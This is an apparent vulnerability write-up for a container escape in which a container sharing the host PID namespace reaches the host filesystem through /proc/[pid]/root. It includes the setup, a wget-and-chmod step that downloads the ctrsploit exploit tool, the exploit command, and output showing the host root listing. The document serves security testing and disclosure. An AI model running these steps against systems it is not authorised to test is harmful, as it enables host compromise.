# host pid escape by /proc/[pid]/root

## 1. Vulnerability Overview

When a container shares the host's PID namespace, it can access the host or other container's filesystem via the `/proc/[pid]/root` directory.
This can lead to a container breakout, allowing an attacker to escape the container and gain access to the host system.

## 2. Exploit Scenario

Insecure configuration

## 3. Prerequisites

* pid=host

## 4. Vulnerability Existence Check

```shell
ctrsploit vul ns pid checksec
```

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2
$ docker compose -f docker-compose.yml -f docker-compose.kvm up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker --version
Docker version 28.3.2, build 578ccf6
root@localhost:~# containerd --version
containerd containerd.io 1.7.27 05044ec0a9a75232cad458027ca83437aae3f4da
root@localhost:~# runc --version
runc version 1.2.5
commit: v1.2.5-0-g59923ef
spec: 1.2.0
go: go1.23.7
libseccomp: 2.5.5
```

</details>

### 5.2 Reproduce Steps

```shell
root@localhost:~# docker run -ti --pid=host --security-opt apparmor=unconfined busybox
/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul ns pid x proc
INFO[0000] trying to chroot to /proc/self/fd/3 (/proc/268/root) 
/proc/self/fd/3 # ls -lah ./
total 72K    
drwxr-xr-x   21 root     root        4.0K Jul 21 10:04 .
drwxr-xr-x   21 root     root        4.0K Jul 21 10:04 ..
lrwxrwxrwx    1 root     root           7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x    2 root     root        4.0K Mar 31  2024 bin.usr-is-merged
drwxr-xr-x    2 root     root        4.0K Jul 21 10:03 boot
drwxr-xr-x    7 root     root         400 Sep 15 02:35 dev
drwxr-xr-x   65 root     root        4.0K Sep 15 02:35 etc
d---------    2 root     root          40 Sep 15 02:35 home
lrwxrwxrwx    1 root     root           7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x    2 root     root        4.0K Nov 14  2024 lib.usr-is-merged
lrwxrwxrwx    1 root     root           9 Apr 22  2024 lib64 -> usr/lib64
drwx------    2 root     root       16.0K Jul 21 10:03 lost+found
drwxr-xr-x    2 root     root        4.0K Apr 15 14:04 media
drwxr-xr-x    2 root     root        4.0K Apr 15 14:04 mnt
drwxr-xr-x    3 root     root        4.0K Sep 15 02:35 opt
dr-xr-xr-x  156 root     root           0 Sep 15 02:35 proc
d---------    2 root     root          40 Sep 15 02:35 root
drwxr-xr-x   19 root     root         540 Sep 15 02:37 run
lrwxrwxrwx    1 root     root           8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x    2 root     root        4.0K Mar 19 18:09 sbin.usr-is-merged
drwxr-xr-x    2 root     root        4.0K Apr 15 14:04 srv
dr-xr-xr-x   13 root     root           0 Sep 15 02:35 sys
drwxrwxrwt    2 root     root        4.0K Sep 15 02:35 tmp
drwxr-xr-x   12 root     root        4.0K Apr 15 14:04 usr
drwxr-xr-x   11 root     root        4.0K Sep 15 02:35 var
```